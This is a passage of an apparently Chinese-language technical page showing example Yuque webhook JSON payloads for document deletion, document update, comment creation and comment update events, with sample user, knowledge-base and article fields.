<span class="hljs-attr">&quot;first_published_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:42:28.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;word_count&quot;</span>: <span class="hljs-number">21</span>,<br>    <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;webhook.doc_detail&quot;</span>,<br>    <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;flamingcrystal/tx5fs5/qddytu&quot;</span>,<br>    <span class="hljs-attr">&quot;publish&quot;</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">&quot;action_type&quot;</span>: <span class="hljs-string">&quot;update&quot;</span>,<br>    <span class="hljs-attr">&quot;webhook_subject_type&quot;</span>: <span class="hljs-string">&quot;update&quot;</span>,<br>    <span class="hljs-attr">&quot;actor_id&quot;</span>: <span class="hljs-number">593074</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="删除文档"><a href="#删除文档" class="headerlink" title="删除文档"></a>删除文档</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">13230337</span>,<br>    <span class="hljs-attr">&quot;slug&quot;</span>: <span class="hljs-string">&quot;trash-ETZ6JpfD&quot;</span>,<br>    <span class="hljs-attr">&quot;title&quot;</span>: <span class="hljs-string">&quot;这是文章的标题&quot;</span>,<br>    <span class="hljs-attr">&quot;book_id&quot;</span>: <span class="hljs-number">1782464</span>,<br>    <span class="hljs-attr">&quot;book&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">1782464</span>,<br>      <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;Book&quot;</span>,<br>      <span class="hljs-attr">&quot;slug&quot;</span>: <span class="hljs-string">&quot;tx5fs5&quot;</span>,<br>      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;示例知识库&quot;</span>,<br>      <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>      <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-string">&quot;点滴学习，随时记录&quot;</span>,<br>      <span class="hljs-attr">&quot;creator_id&quot;</span>: <span class="hljs-number">593074</span>,<br>      <span class="hljs-attr">&quot;public&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;items_count&quot;</span>: <span class="hljs-number">2</span>,<br>      <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;watches_count&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;content_updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.966Z&quot;</span>,<br>      <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:46:07.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:39:58.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;user&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;v2.book&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>    <span class="hljs-attr">&quot;user&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">593074</span>,<br>      <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;User&quot;</span>,<br>      <span class="hljs-attr">&quot;login&quot;</span>: <span class="hljs-string">&quot;flamingcrystal&quot;</span>,<br>      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Flaming Crystal&quot;</span>,<br>      <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;avatar_url&quot;</span>: <span class="hljs-string">&quot;https://cdn.nlark.com/yuque/0/2019/jpeg/anonymous/1573519967166-e0d21489-4ab5-49b6-8893-7e77c44cd2b5.jpeg&quot;</span>,<br>      <span class="hljs-attr">&quot;books_count&quot;</span>: <span class="hljs-number">5</span>,<br>      <span class="hljs-attr">&quot;public_books_count&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;followers_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;following_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2019-11-12T00:53:12.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:39:58.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;v2.user&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;format&quot;</span>: <span class="hljs-string">&quot;lake&quot;</span>,<br>    <span class="hljs-attr">&quot;body&quot;</span>: <span class="hljs-string">&quot;更新了文章&lt;br /&gt;这是文章的内容\n&lt;a name=\&quot;D4wZf\&quot;&gt;&lt;/a&gt;\n# 一级标题\n**加粗**&lt;br /&gt;_斜体_\n\n- list\n&quot;</span>,<br>    <span class="hljs-attr">&quot;body_draft&quot;</span>: <span class="hljs-string">&quot;更新了文章&lt;br /&gt;这是文章的内容\n&lt;a name=\&quot;D4wZf\&quot;&gt;&lt;/a&gt;\n# 一级标题\n**加粗**&lt;br /&gt;_斜体_\n\n- list\n&quot;</span>,<br>    <span class="hljs-attr">&quot;body_html&quot;</span>: <span class="hljs-string">&quot;&lt;!doctype html&gt;&lt;div class=\&quot;lake-content-editor-core lake-engine lake-typography-traditional\&quot; data-lake-element=\&quot;root\&quot; data-selection-undefined=\&quot;%7B%22path%22%3A%5B%5B2%2C0%2C4%5D%2C%5B2%2C0%2C4%5D%5D%2C%22active%22%3Atrue%7D\&quot;&gt;&lt;p data-lake-id=\&quot;e17bcb083075181b3ca5ecd490e0fdf8\&quot; style=\&quot;font-size: 14px; color: rgb(38, 38, 38); line-height: 1.74; letter-spacing: 0.05em; outline-style: none; overflow-wrap: break-word; margin: 0px;\&quot;&gt;&lt;span style=\&quot;color: rgb(245, 34, 45);\&quot;&gt;更新了文章&lt;/span&gt;&lt;/p&gt;&lt;p data-lake-id=\&quot;b791fecaceb7f4797bb8db8ea980d83b\&quot; style=\&quot;font-size: 14px; color: rgb(38, 38, 38); line-height: 1.74; letter-spacing: 0.05em; outline-style: none; overflow-wrap: break-word; margin: 0px;\&quot;&gt;&lt;span&gt;这是文章的内容&lt;/span&gt;&lt;/p&gt;&lt;h1 data-lake-id=\&quot;32cf8b61bf32d3ce61e3918c025210a3\&quot; id=\&quot;D4wZf\&quot; style=\&quot;padding: 7px 0px; margin: 0px; font-weight: 700; font-size: 28px; line-height: 36px;\&quot;&gt;一级标题&lt;/h1&gt;&lt;p data-lake-id=\&quot;c2217c5c3a0ca3e2964daf6e9d9d6372\&quot; style=\&quot;font-size: 14px; color: rgb(38, 38, 38); line-height: 1.74; letter-spacing: 0.05em; outline-style: none; overflow-wrap: break-word; margin: 0px;\&quot;&gt;&lt;strong&gt;加粗&lt;/strong&gt;&lt;/p&gt;&lt;p data-lake-id=\&quot;aa28e7cfeb7ea314fb2017c4d3d0301a\&quot; style=\&quot;font-size: 14px; color: rgb(38, 38, 38); line-height: 1.74; letter-spacing: 0.05em; outline-style: none; overflow-wrap: break-word; margin: 0px;\&quot;&gt;&lt;em&gt;斜体&lt;/em&gt;&lt;/p&gt;&lt;ul data-lake-id=\&quot;9cbd73bdb6680f9f7eb9fde5217a2ffc\&quot; lake-indent=\&quot;0\&quot; style=\&quot;list-style-type: disc; margin: 0px; padding-left: 23px; font-size: 14px; color: rgb(38, 38, 38); line-height: 1.74; letter-spacing: 0.05em; outline-style: none; overflow-wrap: break-word;\&quot;&gt;&lt;li data-lake-id=\&quot;5a58e37ebb365f1905bde74c98d19061\&quot;&gt;list&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&quot;</span>,<br>    <span class="hljs-attr">&quot;public&quot;</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-attr">&quot;status&quot;</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-attr">&quot;view_status&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;read_status&quot;</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;comments_count&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;content_updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;deleted_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:46:06.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:40:57.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:46:07.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;published_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;first_published_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:42:28.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;word_count&quot;</span>: <span class="hljs-number">21</span>,<br>    <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;webhook.doc_detail&quot;</span>,<br>    <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;flamingcrystal/tx5fs5/trash-ETZ6JpfD&quot;</span>,<br>    <span class="hljs-attr">&quot;publish&quot;</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">&quot;action_type&quot;</span>: <span class="hljs-string">&quot;delete&quot;</span>,<br>    <span class="hljs-attr">&quot;webhook_subject_type&quot;</span>: <span class="hljs-string">&quot;delete&quot;</span>,<br>    <span class="hljs-attr">&quot;actor_id&quot;</span>: <span class="hljs-number">593074</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="新增评论"><a href="#新增评论" class="headerlink" title="新增评论"></a>新增评论</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">857182</span>,<br>    <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>    <span class="hljs-attr">&quot;parent_id&quot;</span>: <span class="hljs-literal">null</span>,<br>    <span class="hljs-attr">&quot;body_html&quot;</span>: <span class="hljs-string">&quot;&lt;p data-lake-id=\&quot;a20d224c568e48b9d67847a2c66a8c01_p_0\&quot;&gt;新增了一条&lt;strong&gt;评论&lt;/strong&gt;&lt;/p&gt;&lt;h1&gt;评论中的一级标题&lt;/h1&gt;&quot;</span>,<br>    <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;mood&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:44:46.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:44:46.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;status&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;to_user_id&quot;</span>: <span class="hljs-literal">null</span>,<br>    <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-literal">null</span>,<br>    <span class="hljs-attr">&quot;user&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">593074</span>,<br>      <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;User&quot;</span>,<br>      <span class="hljs-attr">&quot;login&quot;</span>: <span class="hljs-string">&quot;flamingcrystal&quot;</span>,<br>      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Flaming Crystal&quot;</span>,<br>      <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;avatar_url&quot;</span>: <span class="hljs-string">&quot;https://cdn.nlark.com/yuque/0/2019/jpeg/anonymous/1573519967166-e0d21489-4ab5-49b6-8893-7e77c44cd2b5.jpeg&quot;</span>,<br>      <span class="hljs-attr">&quot;followers_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;following_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2019-11-12T00:53:12.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:39:58.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;v2.user&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;webhook.comment_detail&quot;</span>,<br>    <span class="hljs-attr">&quot;commentable&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">13230337</span>,<br>      <span class="hljs-attr">&quot;slug&quot;</span>: <span class="hljs-string">&quot;qddytu&quot;</span>,<br>      <span class="hljs-attr">&quot;title&quot;</span>: <span class="hljs-string">&quot;这是文章的标题&quot;</span>,<br>      <span class="hljs-attr">&quot;book_id&quot;</span>: <span class="hljs-number">1782464</span>,<br>      <span class="hljs-attr">&quot;book&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">1782464</span>,<br>        <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;Book&quot;</span>,<br>        <span class="hljs-attr">&quot;slug&quot;</span>: <span class="hljs-string">&quot;tx5fs5&quot;</span>,<br>        <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;示例知识库&quot;</span>,<br>        <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>        <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-string">&quot;点滴学习，随时记录&quot;</span>,<br>        <span class="hljs-attr">&quot;creator_id&quot;</span>: <span class="hljs-number">593074</span>,<br>        <span class="hljs-attr">&quot;public&quot;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-attr">&quot;items_count&quot;</span>: <span class="hljs-number">3</span>,<br>        <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-attr">&quot;watches_count&quot;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-attr">&quot;content_updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.966Z&quot;</span>,<br>        <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:58.000Z&quot;</span>,<br>        <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:39:58.000Z&quot;</span>,<br>        <span class="hljs-attr">&quot;user&quot;</span>: <span class="hljs-literal">null</span>,<br>        <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;v2.book&quot;</span><br>      &#125;,<br>      <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>      <span class="hljs-attr">&quot;format&quot;</span>: <span class="hljs-string">&quot;lake&quot;</span>,<br>      <span class="hljs-attr">&quot;body&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;body_draft&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;body_html&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;public&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;status&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;view_status&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;read_status&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;comments_count&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;content_updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;deleted_at&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:40:57.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:44:46.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;published_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;first_published_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:42:28.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;word_count&quot;</span>: <span class="hljs-number">21</span>,<br>      <span class="hljs-attr">&quot;user&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;webhook.doc_detail&quot;</span>,<br>      <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;flamingcrystal/tx5fs5/qddytu&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;flamingcrystal/tx5fs5/qddytu#reply-857182&quot;</span>,<br>    <span class="hljs-attr">&quot;action_type&quot;</span>: <span class="hljs-string">&quot;comment_create&quot;</span>,<br>    <span class="hljs-attr">&quot;webhook_subject_type&quot;</span>: <span class="hljs-string">&quot;comment_create&quot;</span>,<br>    <span class="hljs-attr">&quot;actor_id&quot;</span>: <span class="hljs-number">593074</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="更新评论"><a href="#更新评论" class="headerlink" title="更新评论"></a>更新评论</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">857182</span>,<br>    <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>    <span class="hljs-attr">&quot;parent_id&quot;</span>: <span class="hljs-literal">null</span>,<br>    <span class="hljs-attr">&quot;body_html&quot;</span>: <span class="hljs-string">&quot;&lt;p data-lake-id=\&quot;a20d224c568e48b9d67847a2c66a8c01_p_0\&quot;&gt;更新了评论，删除了一级标题&lt;/p&gt;&quot;</span>,<br>    <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;mood&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:44:46.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:45:09.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;status&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;to_user_id&quot;</span>: <span class="hljs-literal">null</span>,<br>    <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-literal">null</span>,<br>    <span class="hljs-attr">&quot;user&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">593074</span>,<br>      <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;User&quot;</span>,<br>      <span class="hljs-attr">&quot;login&quot;</span>: <span class="hljs-string">&quot;flamingcrystal&quot;</span>,<br>      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Flaming Crystal&quot;</span>,<br>      <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;avatar_url&quot;</span>: <span class="hljs-string">&quot;https://cdn.nlark.com/yuque/0/2019/jpeg/anonymous/1573519967166-e0d21489-4ab5-49b6-8893-7e77c44cd2b5.jpeg&quot;</span>,<br>      <span class="hljs-attr">&quot;followers_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;following_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2019-11-12T00:53:12.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:39:58.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;v2.user&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;webhook.comment_detail&quot;</span>,<br>    <span class="hljs-attr">&quot;commentable&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">13230337</span>,<br>      <span class="hljs-attr">&quot;slug&quot;</span>: <span class="hljs-string">&quot;qddytu&quot;</span>,<br>      <span class="hljs-attr">&quot;title&quot;</span>: <span class="hljs-string">&quot;这是文章的标题&quot;</span>,<br>      <span class="hljs-attr">&quot;book_id&quot;</span>: <span class="hljs-number">1782464</span>,<br>      <span class="hljs-attr">&quot;book&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">1782464</span>,<br>        <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;Book&quot;</span>,<br>        <span class="hljs-attr">&quot;slug&quot;</span>: <span class="hljs-string">&quot;tx5fs5&quot;</span>,<br>        <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;示例知识库&quot;</span>,<br>        <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>        <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-string">&quot;点滴学习，随时记录&quot;</span>,<br>        <span class="hljs-attr">&quot;creator_id&quot;</span>: <span class="hljs-number">593074</span>,<br>        <span class="hljs-attr">&quot;public&quot;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-attr">&quot;items_count&quot;</span>: <span class="hljs-number">3</span>,<br>        <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-attr">&quot;watches_count&quot;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-attr">&quot;content_updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.966Z&quot;</span>,<br>        <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:58.000Z&quot;</span>,<br>        <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:39:58.000Z&quot;</span>,<br>        <span class="hljs-attr">&quot;user&quot;</span>: <span class="hljs-literal">null</span>,<br>        <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;v2.book&quot;</span><br>      &#125;,<br>      <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>      <span class="hljs-attr">&quot;format&quot;</span>: <span class="hljs-string">&quot;lake&quot;</span>,<br>      <span class="hljs-attr">&quot;body&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;body_draft&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;body_html&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;public&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;status&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;view_status&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;read_status&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;comments_count&quot;</span>: <span class="hljs-number">1</span>,<br>      <span 